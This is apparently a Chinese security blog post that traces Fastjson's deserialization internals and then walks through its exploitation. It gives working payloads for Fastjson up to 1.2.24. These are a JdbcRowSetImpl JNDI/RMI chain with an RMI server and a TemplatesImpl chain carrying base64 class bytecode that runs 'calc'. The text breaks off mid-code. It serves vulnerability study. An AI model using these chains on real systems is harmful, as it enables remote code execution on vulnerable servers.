+<p>在fastjson进行转换时，必须需要类有一个无参构造方法，最好是通过java bean的格式进行书写，因为如果不是满足java bean则在对json反序列化为对象时可能会出现赋值问题，如果是private或者protected的属性就无法直接进行赋值给反序列化的对象，而如果是public类型的成员变量，就算没有setter方法，还是可以进行赋值的，会通过反射进行赋值</p>
+<p>代码：</p>
+<pre><code class="language-java">package org.example;
+
+public class Main {
+    public String name;
+    public int age;
+    protected String sex;
+
+    public Main() {
+    }
+
+    public Main(String name, int age, String sex) {
+        this.name = name;
+        this.age = age;
+        this.sex = sex;
+    }
+
+    public String getName() {
+        return name;
+    }
+
+    public void setName(String name) {
+        this.name = name;
+    }
+
+    public int getAge() {
+        return age;
+    }
+
+    public void setAge(int age) {
+        this.age = age;
+    }
+
+    public String getSex() {
+        return sex;
+    }
+
+    public void setSex(String sex) {
+        this.sex = sex;
+    }
+
+}
+</code></pre>
+<pre><code class="language-java">package org.example;
+
+import com.alibaba.fastjson.JSON;
+import com.alibaba.fastjson.serializer.SerializerFeature;
+
+public class text{
+    public static void main(String[] args) {
+        Main main = new Main();
+        main.setName(&quot;Bloyet&quot;);
+        String fastjson = JSON.toJSONString(main, SerializerFeature.WriteClassName);
+        System.out.println(fastjson);
+        Object main1 = JSON.parse(fastjson);
+        System.out.println(main1);
+
+    }
+}
+</code></pre>
+<figure data-type="image" tabindex="1"><img src="https://bloyet.github.io/post-images/1749492821777.png" alt="" loading="lazy"></figure>
+<p>我们发现结果出现了@type字样</p>
+<p>如果不使用SerializerFeature.WriteClassName，该方法默认将JSON字符串反序列化为一个JSONObject对象。</p>
+<pre><code class="language-java">package org.example;
+
+import com.alibaba.fastjson.JSON;
+import com.alibaba.fastjson.serializer.SerializerFeature;
+
+public class text{
+    public static void main(String[] args) {
+        Main main = new Main();
+        main.setName(&quot;Bloyet&quot;);
+        String fastjson = JSON.toJSONString(main);
+        System.out.println(fastjson);
+        Object main1 = JSON.parse(fastjson);
+        System.out.println(main1);
+
+    }
+}
+</code></pre>
+<figure data-type="image" tabindex="2"><img src="https://bloyet.github.io/post-images/1749492821801.png" alt="" loading="lazy"></figure>
+<h1 id="fastjson调用简单分析">Fastjson调用简单分析</h1>
+<h2 id="序列化">序列化</h2>
+<p>序列化过程其实没什么好看的，只要知道</p>
+<p>获取属性值分为有无getter，如果没有getter方法，它就无法直接获取private属性或者protected属性，如果为public属性它就会看是否赋初始值，如果没有就表示默认值  有getter方法就getter方法优先</p>
+<pre><code class="language-java">package org.example;
+
+public class Main {
+    public String name;
+    public int age;
+    protected String sex;
+
+    public Main() {
+    }
+
+    public Main(String name, int age, String sex) {
+        this.name = name;
+        this.age = age;
+        this.sex = sex;
+    }
+
+    public String getName() {
+        System.out.println(&quot;调用了geName方法&quot;);
+        return name;
+    }
+
+    public void setName(String name) {
+        this.name = name;
+    }
+
+    public int getAge() {
+        System.out.println(&quot;调用了getAge方法&quot;);
+        return age;
+
+    }
+
+    public void setAge(int age) {
+        this.age = age;
+    }
+
+    public String getSex() {
+        System.out.println(&quot;调用了getSex方法&quot;);
+        return sex;
+    }
+
+    public void setSex(String sex) {
+        this.sex = sex;
+    }
+
+}
+</code></pre>
+<pre><code class="language-java">package org.example;
+
+import com.alibaba.fastjson.JSON;
+import com.alibaba.fastjson.serializer.SerializerFeature;
+
+public class text{
+    public static void main(String[] args) {
+        Main main = new Main();
+        // main.setName(&quot;Bloyet&quot;);
+        String fastjson = JSON.toJSONString(main, SerializerFeature.WriteClassName);
+        // System.out.println(fastjson);
+        //  Object main1 = JSON.parse(fastjson);
+        // System.out.println(main1);
+
+    }
+}
+</code></pre>
+<figure data-type="image" tabindex="3"><img src="https://bloyet.github.io/post-images/1749492821817.png" alt="" loading="lazy"></figure>
+<p>从这个结果来看，也能知道它获取属性值的时候，是通过调用了getter方法</p>
+<h2 id="反序列化">反序列化</h2>
+<p>Fastjson 使用 <code>@type</code> 来标识 JSON 数据中应该反序列化为哪个类。在 JSON 中，<code>@type</code> 字段通常包含了类的全限定名（类的完整路径），用于标识具体的类。</p>
+<p>进源码分析：</p>
+<p>断点打在这里</p>
+<figure data-type="image" tabindex="4"><img src="https://bloyet.github.io/post-images/1749492821832.png" alt="" loading="lazy"></figure>
+<p>本质上还是调用的是parse方法，步入</p>
+<figure data-type="image" tabindex="5"><img src="https://bloyet.github.io/post-images/1749492821848.png" alt="" loading="lazy"></figure>
+<p>继续调用parse方法，步入</p>
+<figure data-type="image" tabindex="6"><img src="https://bloyet.github.io/post-images/1749492821863.png" alt="" loading="lazy"></figure>
+<p>使用传入的 <code>text</code> 和 <code>features</code> 创建一个 <code>DefaultJSONParser</code> 对象。<code>ParserConfig.getGlobalInstance()</code> 表示使用全局配置，确保解析器的行为符合统一的配置标准。DefaultJSONParser这个对象用于实际解析 JSON 文本。我们继续看parser.parse方法</p>
+<figure data-type="image" tabindex="7"><img src="https://bloyet.github.io/post-images/1749492821879.png" alt="" loading="lazy"></figure>
+<p>继续步入</p>
+<figure data-type="image" tabindex="8"><img src="https://bloyet.github.io/post-images/1749492821895.png" alt="" loading="lazy"></figure>
+<p>进入switch语句，token为12</p>
+<figure data-type="image" tabindex="9"><img src="https://bloyet.github.io/post-images/1749492821910.png" alt="" loading="lazy"></figure>
+<p><code>JSONObject</code> 类在 Java 中是处理和操作 JSON 数据的重要工具 ，我们继续跟进parseObject方法</p>
+<figure data-type="image" tabindex="10"><img src="https://bloyet.github.io/post-images/1749492821925.png" alt="" loading="lazy"></figure>
+<p>这个方法里面的内容还挺多的，大致就是根据字符来进行逻辑判断，然后由逻辑判断走到处理方法  我们这里就看关键的@type</p>
+<figure data-type="image" tabindex="11"><img src="https://bloyet.github.io/post-images/1749492821941.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="12"><img src="https://bloyet.github.io/post-images/1749492821957.png" alt="" loading="lazy"></figure>
+<p>这里的JSON.DEFAULT_TYPE_KEY就是@type，进入if语句 进行类加载，接着看怎么加载的，步入loadClass方法</p>
+<figure data-type="image" tabindex="13"><img src="https://bloyet.github.io/post-images/1749492821988.png" alt="" loading="lazy"></figure>
+<p>可以看到虽然是进行类加载，但是其实里面是没有内容的，相当于一个空壳，然后返回clazz，继续往下走</p>
+<figure data-type="image" tabindex="14"><img src="https://bloyet.github.io/post-images/1749492822004.png" alt="" loading="lazy"></figure>
+<p>回到了DefaultJSONParser#parseObject方法，这里是<strong>获取解析器</strong>的地方，步入getDeserializer方法</p>
+<figure data-type="image" tabindex="15"><img src="https://bloyet.github.io/post-images/1749492822019.png" alt="" loading="lazy"></figure>
+<p>这里判断了一下当前缓存中是否存在能够直接获取到解析该 json 数据的解析器，如果有就直接返回了，很显然我们这里没有，所以还需要跟进<code>getDeserializer</code></p>
+<figure data-type="image" tabindex="16"><img src="https://bloyet.github.io/post-images/1749492822034.png" alt="" loading="lazy"></figure>
+<p>这里的内容也很多，我们直接看createJavaBeanDeserializer方法，在这之前就是一些<strong>黑名单</strong>，和是否为数组，集合，Map，或者报错类，步入createJavaBeanDeserializer方法</p>
+<pre><code class="language-java">public ObjectDeserializer getDeserializer(Class&lt;?&gt; clazz, Type type) {
+    ObjectDeserializer derializer = (ObjectDeserializer)this.derializers.get(type);
+    if (derializer != null) {
+        return derializer;
+    } else {
+        if (type == null) {
+            type = clazz;
+        }
+
+        ObjectDeserializer derializer = (ObjectDeserializer)this.derializers.get(type);
+        if (derializer != null) {
+            return (ObjectDeserializer)derializer;
+        } else {
+            JSONType annotation = (JSONType)clazz.getAnnotation(JSONType.class);
+            if (annotation != null) {
+                Class&lt;?&gt; mappingTo = annotation.mappingTo();
+                if (mappingTo != Void.class) {
+                    return this.getDeserializer(mappingTo, mappingTo);
+                }
+            }
+
+            if (type instanceof WildcardType || type instanceof TypeVariable || type instanceof ParameterizedType) {
+                derializer = (ObjectDeserializer)this.derializers.get(clazz);
+            }
+
+            if (derializer != null) {
+                return (ObjectDeserializer)derializer;
+            } else {
+                String className = clazz.getName();
+                className = className.replace('$', '.');
+
+                for(int i = 0; i &lt; this.denyList.length; ++i) {
+                    String deny = this.denyList[i];
+                    if (className.startsWith(deny)) {
+                        throw new JSONException(&quot;parser deny : &quot; + className);
+                    }
+                }
+
+                if (className.startsWith(&quot;java.awt.&quot;) &amp;&amp; AwtCodec.support(clazz) &amp;&amp; !awtError) {
+                    try {
+                        this.derializers.put(Class.forName(&quot;java.awt.Point&quot;), AwtCodec.instance);
+                        this.derializers.put(Class.forName(&quot;java.awt.Font&quot;), AwtCodec.instance);
+                        this.derializers.put(Class.forName(&quot;java.awt.Rectangle&quot;), AwtCodec.instance);
+                        this.derializers.put(Class.forName(&quot;java.awt.Color&quot;), AwtCodec.instance);
+                    } catch (Throwable var11) {
+                        awtError = true;
+                    }
+
+                    derializer = AwtCodec.instance;
+                }
+
+                if (!jdk8Error) {
+                    try {
+                        if (className.startsWith(&quot;java.time.&quot;)) {
+                            this.derializers.put(Class.forName(&quot;java.time.LocalDateTime&quot;), Jdk8DateCodec.instance);
+                            this.derializers.put(Class.forName(&quot;java.time.LocalDate&quot;), Jdk8DateCodec.instance);
+                            this.derializers.put(Class.forName(&quot;java.time.LocalTime&quot;), Jdk8DateCodec.instance);
+                            this.derializers.put(Class.forName(&quot;java.time.ZonedDateTime&quot;), Jdk8DateCodec.instance);
+                            this.derializers.put(Class.forName(&quot;java.time.OffsetDateTime&quot;), Jdk8DateCodec.instance);
+                            this.derializers.put(Class.forName(&quot;java.time.OffsetTime&quot;), Jdk8DateCodec.instance);
+                            this.derializers.put(Class.forName(&quot;java.time.ZoneOffset&quot;), Jdk8DateCodec.instance);
+                            this.derializers.put(Class.forName(&quot;java.time.ZoneRegion&quot;), Jdk8DateCodec.instance);
+                            this.derializers.put(Class.forName(&quot;java.time.ZoneId&quot;), Jdk8DateCodec.instance);
+                            this.derializers.put(Class.forName(&quot;java.time.Period&quot;), Jdk8DateCodec.instance);
+                            this.derializers.put(Class.forName(&quot;java.time.Duration&quot;), Jdk8DateCodec.instance);
+                            this.derializers.put(Class.forName(&quot;java.time.Instant&quot;), Jdk8DateCodec.instance);
+                            derializer = (ObjectDeserializer)this.derializers.get(clazz);
+                        } else if (className.startsWith(&quot;java.util.Optional&quot;)) {
+                            this.derializers.put(Class.forName(&quot;java.util.Optional&quot;), OptionalCodec.instance);
+                            this.derializers.put(Class.forName(&quot;java.util.OptionalDouble&quot;), OptionalCodec.instance);
+                            this.derializers.put(Class.forName(&quot;java.util.OptionalInt&quot;), OptionalCodec.instance);
+                            this.derializers.put(Class.forName(&quot;java.util.OptionalLong&quot;), OptionalCodec.instance);
+                            derializer = (ObjectDeserializer)this.derializers.get(clazz);
+                        }
+                    } catch (Throwable var10) {
+                        jdk8Error = true;
+                    }
+                }
+
+                if (className.equals(&quot;java.nio.file.Path&quot;)) {
+                    this.derializers.put(clazz, MiscCodec.instance);
+                }
+
+                ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
+
+                try {
+                    Iterator var17 = ServiceLoader.load(AutowiredObjectDeserializer.class, classLoader).iterator();
+
+                    while(var17.hasNext()) {
+                        AutowiredObjectDeserializer autowired = (AutowiredObjectDeserializer)var17.next();
+                        Iterator var8 = autowired.getAutowiredFor().iterator();
+
+                        while(var8.hasNext()) {
+                            Type forType = (Type)var8.next();
+                            this.derializers.put(forType, autowired);
+                        }
+                    }
+                } catch (Exception var12) {
+                }
+
+                if (derializer == null) {
+                    derializer = (ObjectDeserializer)this.derializers.get(type);
+                }
+
+                if (derializer != null) {
+                    return (ObjectDeserializer)derializer;
+                } else {
+                    if (clazz.isEnum()) {
+                        derializer = new EnumDeserializer(clazz);
+                    } else if (clazz.isArray()) {
+                        derializer = ObjectArrayCodec.instance;
+                    } else if (clazz != Set.class &amp;&amp; clazz != HashSet.class &amp;&amp; clazz != Collection.class &amp;&amp; clazz != List.class &amp;&amp; clazz != ArrayList.class) {
+                        if (Collection.class.isAssignableFrom(clazz)) {
+                            derializer = CollectionCodec.instance;
+                        } else if (Map.class.isAssignableFrom(clazz)) {
+                            derializer = MapDeserializer.instance;
+                        } else if (Throwable.class.isAssignableFrom(clazz)) {
+                            derializer = new ThrowableDeserializer(this, clazz);
+                        } else {
+                            derializer = this.createJavaBeanDeserializer(clazz, (Type)type);
+                        }
+                    } else {
+                        derializer = CollectionCodec.instance;
+                    }
+
+                    this.putDeserializer((Type)type, (ObjectDeserializer)derializer);
+                    return (ObjectDeserializer)derializer;
+                }
+            }
+        }
+    }
+}
+</code></pre>
+<p>createJavaBeanDeserializer方法</p>
+<p>有很多关于 ASM 前置的检查，这个我们之后再看，<code>JavaBeanInfo.build</code>开始正式构造 beanInfo，步入</p>
+<figure data-type="image" tabindex="17"><img src="https://bloyet.github.io/post-images/1749492822049.png" alt="" loading="lazy"></figure>
+<p>build 方法本身是返回一个 JavaBeanInfo 列表，javaBeanInfo里面储存了即将反序列化bean中的set方法，get方法，无参构造方法，属性值等具体信息，这个方法里面有很多检查的东西，我们先不看，直接看最重要的3个for循环</p>
+<figure data-type="image" tabindex="18"><img src="https://bloyet.github.io/post-images/1749492822064.png" alt="" loading="lazy"></figure>
+<p>第一个 for 循环是用来获取 set 方法，第二个 for 循环是用来获取字段属性，第三个 for 循环是在获取 get 方法</p>
+<figure data-type="image" tabindex="19"><img src="https://bloyet.github.io/post-images/1749492822080.png" alt="" loading="lazy"></figure>
+<p>我们先具体看第一个for，有四个 if 判断</p>
+<p>方法名长度大于4且以set开头，且第四个字母要是大写<br>
+非静态方法<br>
+返回类型为void或当前类<br>
+参数个数为1个</p>
+<pre><code class="language-java">Method[] var30 = methods;
+int var29 = methods.length;
+
+Method method;
+for(i = 0; i &lt; var29; ++i) {
+    method = var30[i];
+    ordinal = 0;
+    int serialzeFeatures = 0;
+    parserFeatures = 0;
+    String methodName = method.getName();
+    if (methodName.length() &gt;= 4 &amp;&amp; !Modifier.isStatic(method.getModifiers()) &amp;&amp; (method.getReturnType().equals(Void.TYPE) || method.getReturnType().equals(method.getDeclaringClass()))) {
+        Class&lt;?&gt;[] types = method.getParameterTypes();
+        if (types.length == 1) {
+            annotation = (JSONField)method.getAnnotation(JSONField.class);
+            if (annotation == null) {
+                annotation = TypeUtils.getSuperMethodAnnotation(clazz, method);
+            }
+
+            if (annotation != null) {
+                if (!annotation.deserialize()) {
+                    continue;
+                }
+
+                ordinal = annotation.ordinal();
+                serialzeFeatures = SerializerFeature.of(annotation.serialzeFeatures());
+                parserFeatures = Feature.of(annotation.parseFeatures());
+                if (annotation.name().length() != 0) {
+                    methodName = annotation.name();
+                    add(fieldList, new FieldInfo(methodName, method, (Field)null, clazz, type, ordinal, serialzeFeatures, parserFeatures, annotation, (JSONField)null, (String)null));
+                    continue;
+                }
+            }
+
+            if (methodName.startsWith(&quot;set&quot;)) {
+                c3 = methodName.charAt(3);
+                String propertyName;
+                if (!Character.isUpperCase((char)c3) &amp;&amp; c3 &lt;= 512) {
+                    if (c3 == 95) {
+                        propertyName = methodName.substring(4);
+                    } else if (c3 == 102) {
+                        propertyName = methodName.substring(3);
+                    } else {
+                        if (methodName.length() &lt; 5 || !Character.isUpperCase(methodName.charAt(4))) {
+                            continue;
+                        }
+
+                        propertyName = TypeUtils.decapitalize(methodName.substring(3));
+                    }
+                } else if (TypeUtils.compatibleWithJavaBean) {
+                    propertyName = TypeUtils.decapitalize(methodName.substring(3));
+                } else {
+                    propertyName = Character.toLowerCase(methodName.charAt(3)) + methodName.substring(4);
+                }
+
+                Field field = TypeUtils.getField(clazz, propertyName, declaredFields);
+                if (field == null &amp;&amp; types[0] == Boolean.TYPE) {
+                    isFieldName = &quot;is&quot; + Character.toUpperCase(propertyName.charAt(0)) + propertyName.substring(1);
+                    field = TypeUtils.getField(clazz, isFieldName, declaredFields);
+                }
+
+                JSONField fieldAnnotation = null;
+                if (field != null) {
+                    fieldAnnotation = (JSONField)field.getAnnotation(JSONField.class);
+                    if (fieldAnnotation != null) {
+                        if (!fieldAnnotation.deserialize()) {
+                            continue;
+                        }
+
+                        ordinal = fieldAnnotation.ordinal();
+                        serialzeFeatures = SerializerFeature.of(fieldAnnotation.serialzeFeatures());
+                        parserFeatures = Feature.of(fieldAnnotation.parseFeatures());
+                        if (fieldAnnotation.name().length() != 0) {
+                            propertyName = fieldAnnotation.name();
+                            add(fieldList, new FieldInfo(propertyName, method, field, clazz, type, ordinal, serialzeFeatures, parserFeatures, annotation, fieldAnnotation, (String)null));
+                            continue;
+                        }
+                    }
+                }
+
+                if (propertyNamingStrategy != null) {
+                    propertyName = propertyNamingStrategy.translate(propertyName);
+                }
+
+                add(fieldList, new FieldInfo(propertyName, method, field, clazz, type, ordinal, serialzeFeatures, parserFeatures, annotation, fieldAnnotation, (String)null));
+            }
+        }
+    }
+}
+</code></pre>
+<p>它最终会被 add 进 fieldInfo 数组，然后这里就没什么好看的了</p>
+<p>走完这里就开始真正解析了，ASM 解析器的原因我们并不能看到具体的内容，直接看源码分析</p>
+<p>当来到 createInstance 方法，它首先是实例化了一个空类，里面的属性值都为默认</p>
+<figure data-type="image" tabindex="20"><img src="https://bloyet.github.io/post-images/1749492822096.png" alt="" loading="lazy"></figure>
+<p>调用setvalue方法，反射调用set方法</p>
+<figure data-type="image" tabindex="21"><img src="https://bloyet.github.io/post-images/1749492822111.png" alt="" loading="lazy"></figure>
+<p>这里也就是利用点所在了</p>
+<h1 id="漏洞利用">漏洞利用</h1>
+<p>由前面知道，在某些情况下进行反序列化时会将反序列化得到的类的构造函数、<code>getter</code>方法、<code>setter</code>方法执行一遍，如果这三种方法中存在危险操作，则可能导致反序列化漏洞的存在</p>
+<p>简单利用：</p>
+<p>在set方法下面插入弹计算器的命令</p>
+<pre><code class="language-java">package org.example;
+
+import java.io.IOException;
+
+public class Main {
+  public String name=&quot;&quot;;
+  public int age;
+  protected String sex=&quot;&quot;;
+
+    public Main() {
+    }
+
+    public Main(String name, int age, String sex) {
+        this.name = name;
+        this.age = age;
+        this.sex = sex;
+    }
+
+    public String getName() {
+        System.out.println(&quot;调用了getName方法&quot;);
+        return name;
+    }
+
+    public void setName(String name) {
+        System.out.println(&quot;调用了setName方法&quot;);
+        this.name = name;
+    }
+
+    public int getAge() throws IOException {
+        System.out.println(&quot;调用了getAge方法&quot;);
+        return age;
+
+    }
+
+    public void setAge(int age) throws IOException {
+        System.out.println(&quot;调用了SetAge方法&quot;);
+        Runtime.getRuntime().exec(&quot;calc&quot;);
+        this.age = age;
+    }
+
+    public String getSex() {
+        System.out.println(&quot;调用了getSex方法&quot;);
+        return sex;
+    }
+
+    public void setSex(String sex) {
+        System.out.println(&quot;调用了setSex方法&quot;);
+        this.sex = sex;
+    }
+
+}
+package org.example;
+
+import com.alibaba.fastjson.JSON;
+import com.alibaba.fastjson.serializer.SerializerFeature;
+
+import java.io.IOException;
+
+public class text{
+    public static void main(String[] args) throws IOException {
+        Main main = new Main();
+        // main.setName(&quot;Bloyet&quot;);
+        String fastjson = JSON.toJSONString(main, SerializerFeature.WriteClassName);
+        System.out.println(fastjson);
+        Object main1 = JSON.parseObject(fastjson);
+        System.out.println(main1);
+
+    }
+}
+</code></pre>
+<figure data-type="image" tabindex="22"><img src="https://bloyet.github.io/post-images/1749492822127.png" alt="" loading="lazy"></figure>
+<p>可以很清楚的看到，在序列化的时候就会自动调用getter方法，然后在反序列化的时候就都会调用</p>
+<p>FastJson中的 <code>parse()</code> 和 <code>parseObject()</code> 方法都可以用来将JSON字符串反序列化成Java对象，<code>parseObject()</code> 本质上也是调用 <code>parse()</code> 进行反序列化的。但是 <code>parseObject()</code> 会额外的将Java对象转为 JSONObject对象，即 <code>JSON.toJSON()</code>。所以进行反序列化时的细节区别在于，<code>parse()</code> 会识别并调用目标类的 <code>setter</code> 方法及某些特定条件的 <code>getter</code> 方法，而 <code>parseObject()</code> 由于多执行了 <code>JSON.toJSON(obj)</code>，所以在处理过程中会调用反序列化目标类的所有 <code>setter</code> 和 <code>getter</code> 方法。</p>
+<p>补充一下poc的写法</p>
+<p>一般的，Fastjson反序列化漏洞的PoC写法如下，@type指定了反序列化得到的类</p>
+<pre><code class="language-java">{
+&quot;@type&quot;:&quot;xxx.xxx.xxx&quot;,
+&quot;xxx&quot;:&quot;xxx&quot;,
+...
+}
+</code></pre>
+<h1 id="fastjson1224利用链">Fastjson&lt;=1.2.24利用链</h1>
+<p>这个版本 主要是有两个利用链JdbcRowSetImpl和Templateslmpl</p>
+<h2 id="jdbcrowsetimpl">JdbcRowSetImpl</h2>
+<p>我们先来分析JdbcRowSetImpl（结合JNDI注入）</p>
+<p>JdbcRowSetImpl中有两个方法符合自动调用并且可以进行利用的：</p>
+<p>JdbcRowSetImpl#setDataSourceName</p>
+<pre><code class="language-java">public void setDataSourceName(String var1) throws SQLException {
+    if (this.getDataSourceName() != null) {
+        if (!this.getDataSourceName().equals(var1)) {
+            super.setDataSourceName(var1);
+            this.conn = null;
+            this.ps = null;
+            this.rs = null;
+        }
+    } else {
+        super.setDataSourceName(var1);
+    }
+
+}
+</code></pre>
+<p>JdbcRowSetImpl#setAutoCommit</p>
+<pre><code class="language-java">public void setAutoCommit(boolean var1) throws SQLException {
+    if (this.conn != null) {
+        this.conn.setAutoCommit(var1);
+    } else {
+        this.conn = this.connect();
+        this.conn.setAutoCommit(var1);
+    }
+
+}
+</code></pre>
+<p>在JdbcRowSetImpl#setAutoCommit 中调用了connect()方法</p>
+<p>JdbcRowSetImpl#connect</p>
+<pre><code class="language-java">private Connection connect() throws SQLException {
+    if (this.conn != null) {
+        return this.conn;
+    } else if (this.getDataSourceName() != null) {
+        try {
+            InitialContext var1 = new InitialContext();
+            DataSource var2 = (DataSource)var1.lookup(this.getDataSourceName());
+            return this.getUsername() != null &amp;&amp; !this.getUsername().equals(&quot;&quot;) ? var2.getConnection(this.getUsername(), this.getPassword()) : var2.getConnection();
+        } catch (NamingException var3) {
+            throw new SQLException(this.resBundle.handleGetObject(&quot;jdbcrowsetimpl.connect&quot;).toString());
+        }
+    } else {
+        return this.getUrl() != null ? DriverManager.getConnection(this.getUrl(), this.getUsername(), this.getPassword()) : null;
+    }
+}
+</code></pre>
+<p>回顾一下InitialContext类的作用</p>
+<p><code>InitialContext</code> 提供了一个默认的上下文环境，允许应用程序在其中查找和绑定对象。</p>
+<p>然后它还调用了lookup方法，参数还刚好就是我们在setDataSourceName方法中可以控制的，结合起来就可以进行JNDI注入了</p>
+<figure data-type="image" tabindex="23"><img src="https://bloyet.github.io/post-images/1749492822143.png" alt="" loading="lazy"></figure>
+<h3 id="jndirmi">JNDI+RMI</h3>
+<p>开启服务</p>
+<pre><code class="language-java">package org.example;
+
+import com.sun.jndi.rmi.registry.ReferenceWrapper;
+
+import javax.naming.Reference;
+import java.rmi.Naming;
+import java.rmi.registry.LocateRegistry;
+
+public class JNDI_server {
+    public static void main(String[] args) throws Exception {
+        LocateRegistry.createRegistry(1099);
+        Reference reference=new Reference(&quot;RMIHello&quot;,&quot;RMIHello&quot;,&quot;http://127.0.0.1:8000/&quot;);
+        ReferenceWrapper referenceWrapper=new ReferenceWrapper(reference);
+        Naming.bind(&quot;rmi://127.0.0.1:1099/Bloyet&quot;,referenceWrapper);
+    }
+}
+</code></pre>
+<p>然后在开启python服务</p>
+<p>然后就是EXP</p>
+<pre><code class="language-java">package org.example;
+import com.alibaba.fastjson.JSON;
+
+
+public class JdbcRowSetImplEXP {
+    public static void main(String[] args) {
+
+        Object exp=JSON.parseObject(&quot;{\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\&quot;DataSourceName\&quot;:\&quot;rmi://localhost:1099/Bloyet\&quot;,\&quot;AutoCommit\&quot;:true}&quot;);
+    }
+}
+</code></pre>
+<p>基本上就是JNDI+RMI乱打，通过fastjson的反序列化冒充了我们之前的客户端</p>
+<h3 id="jndildap">JNDI+LDAP</h3>
+<p>差不多JNDI可以利用的这里都是可以的，这里就不写了</p>
+<h2 id="templatesimpl">TemplatesImpl</h2>
+<p>该链的利用面较窄，由于payload需要赋值的一些属性为<code>private</code>类型，需要在<code>parse()</code>反序列化时设置第二个参数<code>Feature.SupportNonPublicField</code>，服务端才能从JSON中恢复<code>private</code>类型的属性。</p>
+<p>由于部分需要我们更改的私有变量没有 setter 方法，需要使用 <code>Feature.SupportNonPublicField</code> 参数。</p>
+<p>这个类就很熟悉了，我们之前在打cb链的时候也利用到了getter方法的特性进行类加载</p>
+<pre><code class="language-java">TemplatesImpl.getOutputProperties
+      TemplatesImpl.newTransformer
+</code></pre>
+<p>我们还需要满足 <code>_name</code> 不为 null ，<code>_tfactory</code> 不为 null  这些都是CC3的内容了，这里就不多赘述</p>
+<p>然后又因为在fastjson中我们传入的_bytecodes为bytes类型，而Fastjson在序列化的时候会将bytes类型进行base64编码，反序列化的时候就会进行解码，所以我们在传入字节码的时候还需要进行编码</p>
+<p>编码：</p>
+<pre><code class="language-java">package org.example;
+import java.io.IOException;
+import java.nio.file.Files;
+import java.nio.file.Paths;
+import java.util.Base64;
+
+public class text2 {
+    public static void main(String[] args) throws ClassNotFoundException, IOException {
+        byte[] _bytecodess = Files.readAllBytes(Paths.get(&quot;H:\\http.class&quot;));
+        String base64Encoded = Base64.getEncoder().encodeToString(_bytecodess);
+        System.out.println(base64Encoded);
+    }
+}
+</code></pre>
+<p>json格式：</p>
+<pre><code class="language-java">{&quot;@type&quot;:&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;,&quot;_bytecodes&quot;:[&quot;yv66vgAAADQANAoACAAkCgAlACYIACcKACUAKAcAKQoABQAqBwArBwAsAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAAtMdGV4dC9odHRwOwEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGRvY3VtZW50AQAtTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAIaGFuZGxlcnMBAEJbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAApFeGNlcHRpb25zBwAtAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGl0ZXJhdG9yAQA1TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjsBAAdoYW5kbGVyAQBBTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAAg8Y2xpbml0PgEAAWUBABVMamF2YS9pby9JT0V4Y2VwdGlvbjsBAA1TdGFja01hcFRhYmxlBwApAQAKU291cmNlRmlsZQEACWh0dHAuamF2YQwACQAKBwAuDAAvADABAARjYWxjDAAxADIBABNqYXZhL2lvL0lPRXhjZXB0aW9uDAAzAAoBAAl0ZXh0L2h0dHABAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAD3ByaW50U3RhY2tUcmFjZQAhAAcACAAAAAAABAABAAkACgABAAsAAAAvAAEAAQAAAAUqtwABsQAAAAIADAAAAAYAAQAAAAsADQAAAAwAAQAAAAUADgAPAAAAAQAQABEAAgALAAAAPwAAAAMAAAABsQAAAAIADAAAAAYAAQAAABgADQAAACAAAwAAAAEADgAPAAAAAAABABIAEwABAAAAAQAUABUAAgAWAAAABAABABcAAQAQABgAAgALAAAASQAAAAQAAAABsQAAAAIADAAAAAYAAQAAAB0ADQAAACoABAAAAAEADgAPAAAAAAABABIAEwABAAAAAQAZABoAAgAAAAEAGwAcAAMAFgAAAAQAAQAXAAgAHQAKAAEACwAAAGEAAgABAAAAErgAAhIDtgAEV6cACEsqtgAGsQABAAAACQAMAAUAAwAMAAAAFgAFAAAADgAJABIADAAQAA0AEQARABMADQAAAAwAAQANAAQAHgAfAAAAIAAAAAcAAkwHACEEAAEAIgAAAAIAIw==&quot;],&quot;_tfactory&quot;:{ },&quot;_name&quot;:&quot;Bloyet&quot;,&quot;_outputProperties&quot;:{}}
+</code></pre>
+<p>EXP：</p>
+<pre><code class="language-java">package org.example;
+import com.alibaba.fastjson.JSON;
+import com.alibaba.fastjson.parser.Feature;
+
+public class TemplateImplEXP {
+    public static void main(String[] args) {
+
